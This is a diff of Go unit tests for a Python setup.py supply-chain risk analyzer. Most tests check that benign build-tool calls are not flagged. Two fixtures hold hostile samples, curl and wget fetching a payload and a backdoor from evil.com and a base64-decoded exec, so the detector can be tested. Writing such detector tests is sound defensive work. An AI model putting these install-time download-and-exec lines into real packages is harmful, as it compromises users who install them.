@@ -2336,3 +2336,256 @@ if (!fs.existsSync(dest)) {
 		t.Errorf("Expected no patterns for clean script, got: %s", strings.Join(patternNames, ", "))
 	}
 }
+
+// ============================================================
+// Build Pattern Removal — Verify benign patterns are fully removed
+// ============================================================
+
+// Test: mysqlclient with subprocess.check_output(['mysql_config', ...]) and exec(open('version.py').read())
+// Justification: mysqlclient's setup.py calls mysql_config to find MySQL headers/libs and
+//                uses exec(open('version.py').read()) for version detection. Both are standard
+//                C extension build patterns, not supply chain attack vectors.
+// Source: PyPA documentation on building C extensions; mysqlclient build system;
+//         Python Packaging Authority version-reading recommendations
+// Methodology: Pass a realistic mysqlclient setup.py with mysql_config subprocess calls
+//              and exec(open(...).read()) version reading to AnalyzePythonSetup
+// Result: All patterns removed entirely, RiskLevel is LOW (not MEDIUM or HIGH)
+func TestAnalyzePythonSetup_MysqlclientFullBuild(t *testing.T) {
+	setupContent := `
+from setuptools import setup, Extension
+from setuptools.command.build_ext import build_ext
+import subprocess
+import os
+
+exec(open('_mysql/version.py').read())
+
+class MyBuildExt(build_ext):
+    def build_extensions(self):
+        mysql_config = os.popen('mysql_config --cflags').read().strip()
+        mysql_libs = subprocess.check_output(['mysql_config', '--libs'])
+        mysql_include = subprocess.check_output(['mysql_config', '--include'])
+        build_ext.build_extensions(self)
+
+setup(
+    name='mysqlclient',
+    version=version,
+    ext_modules=[Extension('_mysql', sources=['_mysql.c'])],
+    cmdclass={'build_ext': MyBuildExt},
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if analysis.RiskLevel != "LOW" {
+		t.Errorf("Expected LOW risk for mysqlclient build, got %s", analysis.RiskLevel)
+		for _, p := range analysis.DangerousPatterns {
+			t.Logf("  Pattern: %s, Severity: %s, Match: %s", p.Pattern, p.Severity, p.Match)
+		}
+	}
+	if analysis.HasDangerousPatterns {
+		t.Errorf("Expected no dangerous patterns for mysqlclient build, got %d", len(analysis.DangerousPatterns))
+		for _, p := range analysis.DangerousPatterns {
+			t.Logf("  Pattern: %s, Severity: %s, Match: %s", p.Pattern, p.Severity, p.Match)
+		}
+	}
+}
+
+// Test: pg_config subprocess calls in psycopg2 are fully removed
+// Justification: psycopg2 uses subprocess.check_output(['pg_config', '--includedir'])
+//                to detect PostgreSQL headers. pg_config is a standard build tool.
+// Source: PyPA documentation on building C extensions; PostgreSQL pg_config docs
+// Methodology: Pass a psycopg2-like setup.py with pg_config calls
+// Result: All patterns removed entirely, RiskLevel is LOW
+func TestAnalyzePythonSetup_PgConfigFullRemoval(t *testing.T) {
+	setupContent := `
+from setuptools import setup, Extension
+import subprocess
+
+pg_include = subprocess.check_output(['pg_config', '--includedir']).strip()
+pg_libdir = subprocess.check_output(['pg_config', '--libdir']).strip()
+
+ext_modules = [
+    Extension('psycopg2._psycopg',
+              sources=['psycopg/psycopg.c'],
+              include_dirs=[pg_include])
+]
+
+setup(
+    name='psycopg2',
+    version='2.9.9',
+    ext_modules=ext_modules,
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if analysis.RiskLevel != "LOW" {
+		t.Errorf("Expected LOW risk for psycopg2 with pg_config, got %s", analysis.RiskLevel)
+		for _, p := range analysis.DangerousPatterns {
+			t.Logf("  Pattern: %s, Severity: %s, Match: %s", p.Pattern, p.Severity, p.Match)
+		}
+	}
+}
+
+// Test: exec(open('version.py').read()) pattern is benign version reading
+// Justification: exec(open('version.py').read()) is the most common Python pattern for
+//                reading version numbers from a separate file. Used by thousands of packages.
+// Source: Python Packaging Authority recommendations; setuptools documentation
+// Methodology: Pass a setup.py with exec(open(...).read()) for version reading in C ext context
+// Result: exec() pattern removed entirely, not flagged
+func TestAnalyzePythonSetup_ExecOpenVersionRead(t *testing.T) {
+	setupContent := `
+from setuptools import setup, Extension
+
+exec(open('mypackage/version.py').read())
+exec(open("src/_version.py", "r").read())
+
+setup(
+    name='mypackage',
+    version=__version__,
+    ext_modules=[Extension('mypackage._native', sources=['src/native.c'])],
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "exec()" {
+			t.Errorf("exec(open(...).read()) for version reading should not be flagged, but got: %s (match: %s)", p.Description, p.Match)
+		}
+	}
+	if analysis.RiskLevel != "LOW" {
+		t.Errorf("Expected LOW risk for version-reading exec, got %s", analysis.RiskLevel)
+	}
+}
+
+// Test: All *-config subprocess calls are recognized as build tools
+// Justification: Programs matching *-config (mysql_config, pg_config, pkg-config,
+//                python-config, llvm-config) are standard build configuration tools
+//                that report compiler flags and library paths.
+// Source: GNU coding standards for *-config programs; pkg-config documentation
+// Methodology: Pass a setup.py with various *-config subprocess calls
+// Result: All patterns removed entirely
+func TestAnalyzePythonSetup_AllConfigToolsRecognized(t *testing.T) {
+	setupContent := `
+from setuptools import setup, Extension
+import subprocess
+
+mysql_flags = subprocess.check_output(['mysql_config', '--cflags'])
+pg_flags = subprocess.check_output(['pg_config', '--includedir'])
+pkg_flags = subprocess.check_output(['pkg-config', '--libs', 'openssl'])
+python_flags = subprocess.check_output(['python-config', '--includes'])
+llvm_flags = subprocess.check_output(['llvm-config', '--ldflags'])
+xml2_flags = subprocess.check_output(['xml2-config', '--cflags'])
+
+setup(
+    name='multi-config',
+    version='1.0.0',
+    ext_modules=[Extension('native', sources=['native.c'])],
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if analysis.HasDangerousPatterns {
+		t.Errorf("Expected no dangerous patterns for *-config build tools, got %d:", len(analysis.DangerousPatterns))
+		for _, p := range analysis.DangerousPatterns {
+			t.Logf("  Pattern: %s, Severity: %s, Match: %s", p.Pattern, p.Severity, p.Match)
+		}
+	}
+	if analysis.RiskLevel != "LOW" {
+		t.Errorf("Expected LOW risk for *-config build, got %s", analysis.RiskLevel)
+	}
+}
+
+// Test: Dangerous patterns in C extension context include line evidence
+// Justification: When a pattern IS dangerous (e.g., curl download in a C extension setup.py),
+//                the finding should include the specific source line so users can assess it.
+// Source: OSSF Scorecard — transparency in findings improves trust
+// Methodology: Pass a C extension setup.py that also has dangerous network operations
+// Result: Dangerous patterns survive filtering AND include line evidence
+func TestAnalyzePythonSetup_DangerousPatternLineEvidence(t *testing.T) {
+	setupContent := `
+from setuptools import setup, Extension
+import subprocess
+import os
+
+# Build step
+subprocess.check_output(['pkg-config', '--libs', 'libfoo'])
+
+# Dangerous: downloads payload
+subprocess.call(['curl', 'http://evil.com/payload', '-o', '/tmp/evil'])
+os.system('wget http://evil.com/backdoor.sh')
+
+setup(
+    name='suspicious-pkg',
+    version='1.0.0',
+    ext_modules=[Extension('native', sources=['native.c'])],
+)
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Fatal("Expected dangerous patterns for curl/wget in C extension context")
+	}
+
+	// Verify dangerous patterns have evidence
+	foundEvidence := false
+	for _, p := range analysis.DangerousPatterns {
+		if strings.Contains(p.Description, "Evidence") {
+			foundEvidence = true
+			// Evidence should contain the actual code
+			if !strings.Contains(p.Description, "curl") && !strings.Contains(p.Description, "wget") {
+				t.Errorf("Evidence should contain the dangerous command, got: %s", p.Description)
+			}
+		}
+	}
+	if !foundEvidence {
+		t.Error("Expected line evidence in dangerous pattern descriptions")
+		for _, p := range analysis.DangerousPatterns {
+			t.Logf("  Pattern: %s, Description: %s", p.Pattern, p.Description)
+		}
+	}
+
+	// Build-safe patterns (pkg-config) should be removed entirely
+	for _, p := range analysis.DangerousPatterns {
+		if strings.Contains(p.Match, "pkg-config") {
+			t.Errorf("pkg-config subprocess call should be removed, but found: %s", p.Match)
+		}
+	}
+}
+
+// Test: Non-C-extension setup.py with exec() is still flagged with evidence
+// Justification: exec() in a non-C-extension context is suspicious and should be
+//                flagged with the actual line of code as evidence.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020)
+// Methodology: Pass a plain setup.py with exec() — no Extension/ext_modules context
+// Result: exec() flagged as HIGH with line evidence in description
+func TestAnalyzePythonSetup_ExecFlaggedWithEvidence(t *testing.T) {
+	setupContent := `
+from setuptools import setup
+import base64
+
+payload = base64.b64decode('Y3VybCBldmlsLmNvbQ==')
+exec(payload)
+
+setup(name='evil-pkg', version='1.0.0')
+`
+	analysis := AnalyzePythonSetup(setupContent)
+
+	if !analysis.HasDangerousPatterns {
+		t.Fatal("Expected dangerous patterns for exec() in non-build context")
+	}
+
+	foundExecWithEvidence := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "exec()" && strings.Contains(p.Description, "Evidence") {
+			foundExecWithEvidence = true
+			if !strings.Contains(p.Description, "exec(payload)") {
+				t.Errorf("Evidence should show the actual exec call, got: %s", p.Description)
+			}
+		}
+	}
+	if !foundExecWithEvidence {
+		t.Error("Expected exec() pattern with line evidence")
+		for _, p := range analysis.DangerousPatterns {
+			t.Logf("  Pattern: %s, Description: %s", p.Pattern, p.Description)
+		}
+	}
+}
